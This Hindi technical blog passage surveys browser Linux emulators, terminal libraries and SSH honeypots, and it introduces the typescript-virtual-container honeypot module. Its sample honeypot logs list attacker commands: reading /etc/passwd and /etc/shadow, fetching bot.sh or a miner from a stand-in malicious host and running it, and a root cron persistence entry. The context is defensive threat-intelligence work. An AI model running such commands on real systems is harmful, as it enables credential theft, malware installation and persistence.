**मूल्य निर्धारण** : ओपन सोर्स प्रोजेक्टों के लिए मुफ्त, production SaaS के लिए वाणिज्यिक लाइसेंस।
**Docs** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) , Wasm में Node.js, Linux emulation नहीं

WebContainers अक्सर Linux emulator वाले थैले में रखे जाते हैं लेकिन आर्किटेक्चर अलग हैं। वे x86 अनुकरण नहीं करते। वे Linux boot नहीं करते। वे WASI इस्तेमाल करके WebAssembly में संकलित Node.js चलाते हैं। यह भेद बहुत मायने रखता है और मैंने इस बारे में भ्रमित रहने में बहुत ज्यादा समय बिताया।

मुझे लगता है भ्रम marketing से आता है, "तुम्हारे ब्राउज़र में Node.js चलाना" emulation जैसा लगता है, लेकिन यह असल में Wasm में संकलित खुद Node.js है, VM में Node.js चलाने वाला Linux emulation नहीं। दो पूरी तरह अलग आर्किटेक्चर।

आर्किटेक्चर :
1. Node.js Wasm में संकलित है (विशेष रूप से अनुकूलित कस्टम WASI runtime)
2. Service Worker अनुकरण Node.js serveur के नेटवर्क अनुरोध रोकता है और उन्हें ब्राउज़र tab की ओर route करता है
3. filesystem ब्राउज़र स्मृति में रहता है (कोई डिस्क I/O नहीं)
4. npm ब्राउज़र उपयोग के लिए अनुकूलित कस्टम कार्यान्वयन है

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// फाइलें लिखना
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js कमांड निष्पादित करना
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

क्योंकि यह असली Node.js चलाता है (Wasm में संकलित), तुम्हें असली npm, असली Node.js API, और असली मॉड्यूल resolution मिलता है। तुम्हें सामान्यवादी Linux userspace नहीं मिलता, तुम `apt` से तंत्र पैकेज स्थापित नहीं कर सकते, मनमाने संकलित binary निष्पादित नहीं कर सकते, या Node.js पारिस्थितिकी तंत्र के बाहर ज्यादा कुछ नहीं कर सकते।

**ब्राउज़र पूर्वापेक्षा** : SharedArrayBuffer (COOP/COEP हेडर चाहिए), Service Worker समर्थन, आधुनिक Wasm।

**Node.js कहानी** : विशेष रूप से ब्राउज़र उपयोग के लिए डिजाइन। API ब्राउज़र संदर्भ बाहर काम नहीं करता।

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Docs** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm , Wasm में संकलित Docker कंटेनर

`container2wasm` NTT का उपकरण (npm पैकेज नहीं) है जो Docker कंटेनर छवि लेता है और उसे WebAssembly binary में बदलता है जो किसी भी Wasm host में चल सकता है, ब्राउज़र सहित। जब मैंने यह पहली बार देखा, तो मुझे सच में विश्वास नहीं हुआ कि यह काम करता है।

तंत्र :
- x86_64 कंटेनर के लिए : Bochs (Wasm में संकलित x86 emulator) + कंटेनर root filesystem रखता है
- riscv64 कंटेनर के लिए : TinyEMU (फिर Bellard !) + कंटेनर root filesystem रखता है
- परिणामी `.wasm` फाइल emulator शुरू करती है, कंटेनर filesystem mount करती है, और कंटेनर entrypoint निष्पादित करती है

```bash
# Ubuntu 22.04 कंटेनर को Wasm में बदलना
c2w ubuntu:22.04 out.wasm

# उसे निष्पादित करना
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# या ब्राउज़र उपयोग के लिए परोसना
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

परिणामी `.wasm` भारी है, न्यूनतम Ubuntu कई सौ Mo करती है, लेकिन वह पूरी तरह स्वायत्त है। तुम किसी को email से `.wasm` भेज सकते हो और वह अपने ब्राउज़र में Ubuntu चला सकता है। इस वाक्य का अर्थ नहीं होना चाहिए लेकिन हम यहाँ हैं।

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### emulator परिवार सारांश

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **आर्किटेक्चर** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (मालिकाना) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **असली कर्नल** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-बिट** | ❌ | ✅ (RISC-V) | ❌ | ✅ | लागू नहीं | ✅ |
| **npm पैकेज** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI उपकरण) |
| **Node.js उपयोग** | ✅ | ❌ | ❌ | ❌ | ❌ (सिर्फ ब्राउज़र) | Wasmtime से |
| **ब्राउज़र उपयोग** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/उदाहरण** | 150-256 Mo | ~64-128 Mo | ~64 Mo | 200+ Mo | ~100 Mo | ~200-500 Mo |
| **boot समय** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **ओपन सोर्स** | ✅ | ✅ | ✅ | ❌ | आंशिक | ✅ |
| **स्थिति** | ✅ बहुत सक्रिय | ✅ स्थिर | ⚠️ अभिलेखित | ✅ वाणिज्यिक | ✅ सक्रिय | ✅ सक्रिय |

इस तालिका में जो चुभता है : `v86` अकेला है जो npm पैकेज है, जो ब्राउज़र और Node दोनों में चलता है, और जो ओपन सोर्स है। इसीलिए वह "JavaScript Linux emulator" बातचीत पर हावी है। बाकी सब में खामी है, JSLinux में API नहीं है, jor1k अभिलेखित है, CheerpX पैसे खर्च करता है, WebContainers सिर्फ ब्राउज़र और Node विशिष्ट है, container2wasm को build चरण और CLI चाहिए। अगर तुम्हें बस "JavaScript में Linux boot" चाहिए, तो `v86` लगभग हमेशा सही शुरुआत है।

---

## भाग 3 , terminal stack : xterm.js और node-pty

दो पैकेज लगातार लौटते हैं जब लोग shell तरह के अनुभव बनाते हैं। ये sandbox या emulator नहीं हैं, ये UI और PTY plumbing हैं, लेकिन वे इतने संबंधित हैं कि उन्हें छोड़ने पर मुझे बुरा लगेगा। साथ ही, मैंने दोनों इस्तेमाल किए हैं और वे सच में अच्छे हैं।

### 3.1 `xterm.js` , terminal रेंडर

xterm.js ब्राउज़र के लिए terminal emulator है। वह `<canvas>` तत्व में terminal स्क्रीन (VT100/xterm escape अनुक्रम) दिखाता है, keyboard input संभालता है, और डेटा भेजने के लिए API उजागर करता है।

इस्तेमाल करते हैं : VS Code एकीकृत terminal, Azure Cloud Shell, Proxmox VE, AWS CloudShell, और बहुत अन्य।

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// terminal को डेटा भेजना (पाठ के रूप में दिखाया गया)
term.write("$ ");
term.onData(data => {
  // data keystroke हैं, अपने backend को भेजो
  socket.send(data);
});
socket.onmessage(msg => {
  // backend output, उसे दिखाओ
  term.write(msg.data);
});
```

xterm.js सिर्फ रेंडर परत है। वह shell निष्पादित नहीं करता। वह कमांड व्याख्या नहीं करता। यह प्रदर्शन widget है जिसे तुम अपनी पसंद के backend से जोड़ते हो। बहुत से लोग सोचते हैं कि xterm.js "terminal करता" है लेकिन यह सच में सिर्फ स्क्रीन है, तुम्हें अभी उसे किसी चीज से जोड़ना होगा जो सच में कमांड निष्पादित करती है।

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` , PTY निर्माण

`node-pty` Node.js में pseudoterminal (PTY) बनाता है और तुम्हें उस पर पढ़ने/लिखने handle देता है। xterm.js से इस्तेमाल, वह ब्राउज़र terminal बनाने देता है जो serveur पर चल रहे असली shell (bash, zsh, fish) से बात करता है।

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // ब्राउज़र xterm.js को WebSocket से भेजना
  ws.send(data);
});

ws.on("message", data => {
  // ब्राउज़र keystroke shell को भेजना
  shell.write(data);
});
```

यह cloud IDE और web terminal का मानक schema है : xterm.js (ब्राउज़र) ↔ WebSocket ↔ node-pty ↔ असली bash। अलगाव शून्य रहता है। shell Node.js प्रक्रिया (या उसे चलाने वाले उपयोगकर्ता) की सभी अनुमतियों से निष्पादित होता है।

**रखरखाव करते हैं** : Microsoft।
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## भाग 4 , SSH honeypot

honeypot हमला खाने के लिए डिजाइन किए हैं। लक्ष्य काफी असली दिखना है कि हमलावर उनसे बातचीत करें, साथ ही खतरा खुफिया के लिए वे जो करते हैं सब दर्ज करना। SSH मुख्य लक्ष्य है क्योंकि यह internet पर सबसे हमला सेवा है, अगर तुम सार्वजनिक IP पर port 22 उजागर करते हो, तो तुम सचमुच कुछ मिनटों में स्वचालित scan प्रयास देखोगे। एक दिन आजमाओ, यह कितनी जल्दी होता है यह काफी भयानक है।

honeypot गुणवत्ता दो चीजों से मापी जाती है : **निष्ठा** (वह कितनी आश्वस्त असली तंत्र की नकल करता है) और **telemetry** (वह कितना उपयोगी डेटा पकड़ता है)। ये दो चीजें तनाव में हैं। उच्च निष्ठा honeypot बनाना कठिन और संचालित करना जोखिम भरा है।

यह खंड है जो मुझे आखिर `typescript-virtual-container` में `HoneyPot` मॉड्यूल बनाने ले गया, इसलिए यहाँ मेरी कुछ राय हैं।

### 4.1 Cowrie , स्वर्ण मानक

Cowrie Python आधारित मध्यम से उच्च interaction SSH और Telnet honeypot है। यह शोध और सुरक्षा समुदाय में सबसे तैनात SSH honeypot है।

आर्किटेक्चर :
- **प्रोटोकॉल परत** : असली SSH प्रोटोकॉल कार्यान्वयन (Twisted Conch), इसलिए हमलावरों को असली handshake, असली कुंजी आदान प्रदान, असली प्रमाणीकरण मिलता है
- **shell परत** : नकली filesystem (Debian 5.0 जैसा) और आंशिक shell दुभाषिया जो सामान्य कमांड जवाब देता है
- **proxy मोड** : पीछे असली तंत्र की ओर redirect कर सकता है (उच्च interaction मोड), गुजरने वाली हर चीज दर्ज करते हुए
- **LLM मोड** (हाल जोड़ा गया) : उन कमांडों के गतिशील उत्तर बनाने के लिए भाषा मॉडल इस्तेमाल करता है जिन्हें वह संभालना नहीं जानता, हाँ, Cowrie के पास अब AI मोड है। हम पागल युग जी रहे हैं।

```python
# Cowrie क्या पकड़ता है
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie डाउनलोड फाइलें (wget/curl/SFTP/SCP से) malware विश्लेषण के लिए सहेजता है। वह Splunk, Elasticsearch, और अन्य SIEM मंचों से एकीकृत होता है।

**निष्ठा** : मध्यम उच्च। स्वचालित बॉट धोखा देने को काफी आश्वस्त (जो 99% SSH हमलावर हैं, ज्यादातर सिर्फ मूर्ख script हैं जो `root`/`password` आजमाती हैं)। परिष्कृत मानव उसे fingerprint से पहचान सकते हैं हालाँकि, आमतौर पर काफी जल्दी।

**भाषा** : Python (Twisted)
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo , Cowrie पूर्ववर्ती

Kippo मूल मध्यम interaction SSH honeypot है जिस पर Cowrie आधारित था। वही बुनियादी विचार : असली SSH प्रोटोकॉल, नकली filesystem, आंशिक shell। Cowrie ने इस स्तर पर उसे पूरी तरह बदला है, Kippo अभिलेखित है और 2026 में किसी को उसे इस्तेमाल नहीं करना चाहिए। यहाँ विशुद्ध ऐतिहासिक पूर्णता के लिए उल्लेखित, चूँकि तुम उसे पुराने ब्लॉग लेखों और सुरक्षा पत्रों में संदर्भित देख सकते हो।

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo) , अभिलेखित

---

### 4.3 endlessh , SSH tarpit

endlessh पतित honeypot है : वह banner डेटा धीरे 1 octet प्रति सेकंड (या कम) फैलाकर SSH कनेक्शन खुले रखता है। SSH client जो उससे जुड़ता है अनिश्चित अवरुद्ध रहेगा, वह कभी प्रमाणीकरण नहीं पहुँचेगा क्योंकि serveur banner भेजना कभी खत्म नहीं करता।

लक्ष्य खतरा खुफिया नहीं बल्कि शुद्ध संसाधन इनकार है : हमलावरों के scan thread व्यस्त रखना ताकि वे असली लक्ष्यों तक उतनी तेज न पहुँच सकें। यह ईमानदारी से अच्छे अर्थ में थोड़ा शैतानी है। तुम हमलावर से कुछ नहीं सीखते, तुम बस उसका समय बर्बाद करते हो। इसमें कुछ गहरा संतोषजनक है।

```c
// endlessh का सारा प्रोटोकॉल व्यवहार :
// भेजना : "SSH-2.0-OpenSSH_" फिर धीरे बेतरतीब अक्षर जोड़ना
// कनेक्शन कभी बंद मत करना
// हमलावर scanner N सेकंड बाद समाप्त होता है
```

कोई कमांड पकड़ी नहीं जाती। कोई प्रमाणीकरण परखा नहीं जाता। सिर्फ कनेक्शन समय।

**लिखा है** : C में
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame , "सबको अंदर आने दो" honeypot

sshesame सभी SSH कनेक्शन स्वीकार करता है (कोई भी उपयोगकर्ता, कोई भी पासवर्ड, कोई भी कुंजी) और सब दर्ज करता है। यह शून्य interaction honeypot है : वह कमांड जवाब नहीं देता, वह बस हमलावरों को "प्रवेश" करने देता है और हर keystroke दर्ज करता है जो वे टाइप करते हैं।

```
2024-01-15 03:22:11 45.33.32.156 से कनेक्शन
  उपयोगकर्ता : root, पासवर्ड : password123 , स्वीकृत
  टाइप कमांड :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47s बाद disconnect
```

credential संग्रह के लिए उपयोगी : तुम जल्दी उपयोगकर्ता नाम और पासवर्ड जमा करते हो जिन्हें बॉट आजमाते हैं, जो बताता है कि कौन से डिफ़ॉल्ट credential वर्तमान सक्रिय bruteforce हो रहे हैं। Spoiler : यह हमेशा `root`/`password`, `admin`/`admin`, और `root`/`123456` है। हर बार।

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird , Docker आधारित honeypot framework

`lyrebird/honeypot-base` नेटवर्क service honeypot बनाने के लिए Docker आधार छवि है। यह विशेष रूप से SSH honeypot नहीं है, यह किसी भी प्रोटोकॉल के लिए honeypot बनाने का framework है।

आधार छवि logging framework, प्रोटोकॉल के लिए plugin तंत्र, और बहु service honeypot के लिए Docker Compose कॉन्फ़िगरेशन देती है। तुम विशिष्ट service अनुकरण करने के लिए उसे बढ़ाते हो।

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.js में SSH honeypot बनाना , भोली विधि, और यह विफल क्यों होती है

`typescript-virtual-container` से पहले, Node.js में SSH honeypot बनाने का मतलब असली `ssh2` लाइब्रेरी को मैन्युअल कमांड अनुकरण से जोड़ना था। बहुत थकाऊ, बहुत अपूर्ण, लेकिन... इस स्तर पर यह अनिवार्य चरण है :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // प्रयास log करना
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // सबको अंदर आने देना
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // अनुकरण उत्तर
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

यह उस अर्थ में "काम" करता है कि यह credential और कमांड पकड़ता है। लेकिन यह स्पष्ट गलत है जैसे ही परिष्कृत हमलावर थोड़ा खोदता है। `uname -a` सही स्ट्रिंग लौटाता है लेकिन `ls /etc` "command not found" लौटाता है, यह पूरी नाक से जाल गंध देता है। filesystem मौजूद नहीं है। कमांड शृंखला नहीं बनतीं। pipe काम नहीं करते। चर expand नहीं होते।

सक्षम हमलावर पहले पाँच कमांड में तुम्हारा honeypot पहचानेगा। Cowrie तरह के व्यवहार खोजने वाली स्वचालित script भी उसे तुरंत पहचानेंगी। जाहिर है यही है जिसने `typescript-virtual-container` लेखिका को कुछ बनाने को धकेला जो सच में कमांड व्याख्या करता है, इस पर भाग 5 में ज्यादा।

---

### honeypot परिवार सारांश

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | भोली ssh2 |
|---|---|---|---|---|---|---|
| **interaction स्तर** | मध्यम उच्च | मध्यम | शून्य | शून्य | परिवर्तनीय | कम |
| **असली SSH प्रोटोकॉल** | ✅ | ✅ | ❌ (tarpit) | ✅ | परिवर्तनीय | ✅ |
| **shell निष्ठा** | मध्यम | मध्यम | लागू नहीं | कोई नहीं | परिवर्तनीय | न्यूनतम |
| **credential पकड़ता है** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **कमांड पकड़ता है** | ✅ | ✅ | ❌ | ✅ | परिवर्तनीय | ✅ |
| **malware पकड़ता है** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM एकीकरण** | ✅ नेटिव | ❌ | ❌ | ❌ | ❌ | मैन्युअल |
| **LLM उत्तर** | ✅ (नया) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **भाषा** | Python | Python | C | Go | Docker | Node.js |
| **नेटिव Node.js** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **स्थिति** | ✅ बहुत सक्रिय | ⚠️ अभिलेखित | ✅ सक्रिय | ✅ सक्रिय | ✅ सक्रिय | DIY |

यहाँ pattern काफी स्पष्ट है : जितनी निष्ठा तुम चाहते हो, उतना Python तुम्हें लिखना होगा। Cowrie निर्विवाद विजेता है अगर तुम यह गंभीरता से करते हो, वह सालों मैदान में परखा गया है और सिर्फ credential से कहीं ज्यादा पकड़ता है। endlessh और sshesame गंभीर खतरा खुफिया उपकरणों से ज्यादा अच्छे प्रोजेक्ट हैं। और Node.js में भोली दृष्टिकोण तुम्हें दीवार टकराने से पहले शायद 20% रास्ता ले जाता है।

---

## भाग 5 , `typescript-virtual-container` : जो खाई भरता है

ठीक तो यहाँ चीजें दिलचस्प होती हैं। ऊपर सभी परिवार सूचीबद्ध करने के बाद, छूटा quadrant काफी स्पष्ट होता है :

- JS sandbox : कोड अलग करते हैं, कोई shell नहीं, कोई filesystem नहीं, कोई SSH नहीं
- Linux emulator : असली OS, असली shell, असली SSH... लेकिन 150+ Mo RAM, 30 सेकंड boot, और तुम्हें क्रमिक I/O ऊपर अपनी API बनानी होगी
- honeypot : नकली shell, कोई प्रोग्राम करने योग्य API नहीं, Python/Go/C, नेटिव Node नहीं

किसी ने असली SSH, असली अनुमतियों, असली आभासी नेटवर्क, और typed TypeScript API वाला पूर्ण, प्रोग्राम करने योग्य, नेटिव Node Linux वातावरण नहीं बनाया था। तो उसने उसे बनाया।

छोटा परिचय चूँकि पहली बार है कि मैं उसका सही उल्लेख करता हूँ : `typescript-virtual-container` [Chloé Rolzhausen](https://itsrealfortune.fr) ने बनाया था, फ्रांसीसी developpeuse जो ऑनलाइन **Fortune** (या ItsRealFortune) कहलाती है। तुम उसे उसके [web साइट](https://itsrealfortune.fr) और [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/) पर पा सकते हो। पूरा प्रोजेक्ट, TypeScript की 56 000 पंक्तियाँ, 247 फाइलें, 170 कमांड, एक ही व्यक्ति का एकल प्रयास था। मैं बाकी लेख के लिए उसे Fortune बुलाऊँगा। और हाँ, यह काफी पागल है। उसके काम पर नजर डालो !

### यह असल में क्या है

`typescript-virtual-container` शुद्ध TypeScript में लिखा **Linux वातावरण simulator** है। बिना Wasm, बिना नेटिव एक्सटेंशन, बिना कर्नल। 247 TypeScript फाइलों में ~56 000 स्रोत पंक्तियाँ।

मुख्य अंतर्दृष्टि : `ls /etc | grep passwd` चलाने के लिए तुम्हें CPU emulator नहीं चाहिए। तुम्हें चाहिए :
1. स्मृति में नोड वृक्ष जो पथ ऑपरेशन जवाब देते हैं
2. हर पहुँच पर लागू POSIX अनुमति मॉडल
3. shell syntax parser जो pipeline, redirection, उप shell और चर विस्तार समझता है
4. ~170 कमांड कार्यान्वयन (फंक्शन, binary नहीं)
5. उपयोगकर्ता और समूह प्रबंधन तंत्र
6. यह सब SSH से उजागर करने के लिए कुछ

यह सब बिना किसी कर्नल निहितार्थ शुद्ध TypeScript में करने योग्य है।

### VirtualFileSystem

VFS typed नोड का स्मृति वृक्ष है, जब तक तुम स्पष्ट `"fs"` स्थायित्व मोड सक्रिय न करो कोई डिस्क I/O नहीं :

```ts
// सरलीकृत आंतरिक निरूपण
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // आलसी लोड placeholder
```

हर पथ ऑपरेशन `normalizePath` (`.`, `..`, प्रतीकात्मक लिंक सुलझाता है) और `enforceAccess` (माँगने वाले uid/gid मुकाबले पढ़ना/लिखना/निष्पादन अनुमतियाँ जाँचता है) से गुजरता है। `chmod`, `chown`, sticky bit और setuid सभी लागू हैं और सच में लागू होते हैं। अगर uid 1000 के रूप में चल रही प्रक्रिया 0600 मोड वाले root स्वामित्व फाइल पढ़ने की कोशिश करती है, तो उसे EACCES मिलता है, नकली EACCES नहीं, अनुमति जाँच से फेंकी असली JavaScript `Error`। यह हिस्सा ईमानदारी से काफी सुरुचिपूर्ण है।

VFS क्रमबद्ध होता है :
- `.vfsb` , संक्षिप्त binary प्रारूप (कस्टम, fflate संपीड़न के साथ), यह डिफ़ॉल्ट प्रारूप है
- JSON snapshot , मानव पठनीय, डिबग के लिए अच्छा
- TAR अभिलेख , असली tar प्रारूप से आयात/निर्यात, इसलिए तुम कुछ `tar -xf` कर सकते हो और VFS के पास बस... ये फाइलें हैं
- SquashFS छवि , सिर्फ पढ़ने आयात

`"fs"` स्थायित्व मोड में, वह crash बाद पुनर्प्राप्ति के लिए write-ahead log (WAL) रखता है, लिखना पहले journal में जाता है, फिर flush पर snapshot में। अगर Node ऑपरेशन बीच में crash करता है, तो journal तुम्हें आखिरी पूर्ण स्थिति पुनर्निर्माण करने देता है।

`FileCache` परत भी है जो डिस्क I/O विलंबता अनुकरण करती है। तुम `NVME_DISK_IO` या `HDD_DISK_IO` जैसे प्रोफाइल कॉन्फ़िगर करते हो और VFS यथार्थवादी समय से मेल खाने के लिए फाइल ऑपरेशन कृत्रिम विलंबित करता है। जो काफी मजेदार है, software जो hardware अनुकरण करने के लिए जानबूझकर धीमा होता है, लेकिन असल में benchmark के लिए बहुत उपयोगी है।

### shell दुभाषिया

shell syntax parser typed AST बनाता है :

```ts
// "ls /etc | grep root && echo done" इसमें parse होता है :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

निष्पादक इस AST चलता है :
- pipeline के लिए, वह `{ stdin, stdout, stderr }` प्रवाह शृंखला बनाता है और pipelined I/O के साथ हर कमांड निष्पादित करता है
- तार्किक ऑपरेटर (`&&`, `||`) के लिए, वह दायाँ निष्पादित करने से पहले बाएँ बाद `$?` जाँचता है
- उप shell (`$(...)`, `` ` ` ``) के लिए, वह निष्पादन संदर्भ fork करता है
- redirection (`>फाइल`, `>>फाइल`, `2>&1`, `<फाइल`) के लिए, वह निष्पादन से पहले प्रवाह wiring कॉन्फ़िगर करता है
- पृष्ठभूमि कार्य (`cmd &`) के लिए, वह खत्म प्रतीक्षा किए बिना निष्पादित करता है
- चर के लिए, वह `$VAR`, `${VAR:-default}`, `${#VAR}`, और अंकगणित `$((expr))` expand करता है
- brace विस्तार (`{a,b,c}`, `{1..5}`) के लिए, वह निष्पादित करने से पहले पूर्ण विस्तार सूची बनाता है

यह सब असली POSIX shell व्यवहार है। parser heredoc, प्रक्रिया प्रतिस्थापन, globbing (`*`, `?`, `[abc]`), और उद्धरण प्रबंधन (interpolation रहित एकल उद्धरण, interpolation वाले दोहरे उद्धरण, backslash escape) संभालता है। यह पूर्ण नहीं है, सीमांत मामले मौजूद हैं, लेकिन यह TypeScript प्रोजेक्ट से अपेक्षा से कहीं परे है।

### ~170 अंतर्निहित कमांड

कमांड कमांड registry में दर्ज TypeScript फंक्शन हैं। वे stdin/stdout/stderr प्रवाह, VFS, उपयोगकर्ता सत्र, shell वातावरण, और उप मॉड्यूल पहुँच वाला `CommandContext` पाते हैं।

170 Unix कमांड कार्यान्वयन लिखना... बहुत है। कुछ मामूली हैं (`echo`, `true`, `false`), कुछ आश्चर्यजनक जटिल हैं (`awk`, `find`, `tar`)। जैसे, पूर्ण POSIX `awk` ? TypeScript में ? यह ईमानदारी से पागल है। यहाँ नमूना है कि इसमें क्या है :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (client तरफ, बाहर जाने वाला कनेक्शन),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (पूर्ण इंटरैक्टिव एडिटर), vim (बुनियादी), vi (बुनियादी),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (अनुकरण), systemctl (stub), journalctl (stub),
...और लगभग 130 अन्य
```

"stub" (git, python3, node) सामान्य आह्वानों को यथार्थवादी जवाब देते हैं, `python3 --version` विश्वसनीय संस्करण स्ट्रिंग लौटाता है, `git status` काल्पनिक भंडार स्थिति दिखाता है, बिना असली काम किए। honeypot के लिए, ये असल में असली कमांडों से ज्यादा उपयोगी हैं, क्योंकि वे तुम्हें देखने देते हैं कि हमलावर क्या निष्पादित करने की कोशिश करते हैं बिना कुछ खतरनाक निष्पादित किए।

### SSH serveur

SSH परत असली npm `ssh2` पैकेज इस्तेमाल करती है, असली SSH प्रोटोकॉल, असली कुंजी आदान प्रदान, असली एन्क्रिप्शन। `SSHMimic` उसे लपेटता है :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// असली SSH : ssh -p 2222 root@localhost
// असली SFTP : sftp -P 2222 root@localhost
// असली SCP : scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` तय करते हैं कि `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, और `/etc/os-release` क्या रिपोर्ट करते हैं। तुम आश्वस्त किसी भी Linux वितरण और कर्नल संस्करण की नकल कर सकते हो, असली SSH client के लिए, सचमुच अंतर करने का कोई तरीका नहीं है।

### HoneyPot मॉड्यूल

क्योंकि shell दुभाषिया असली है और SSH serveur असली है, हमलावर कमांड आभासी वातावरण में सच में निष्पादित होती हैं। हमलावर trigger `wget` अनुरोध गंतव्य URL के साथ log किए जाते हैं। हमलावर बनाई फाइलें VFS में सहेजी जाती हैं। हमलावर विशेषाधिकार वृद्धि प्रयास यथार्थवादी त्रुटियाँ बनाते हैं।

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// सत्र बाद, filesystem अंतर करना
const before = shell.vfs.toSnapshot();
// ... हमलावर सत्र ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

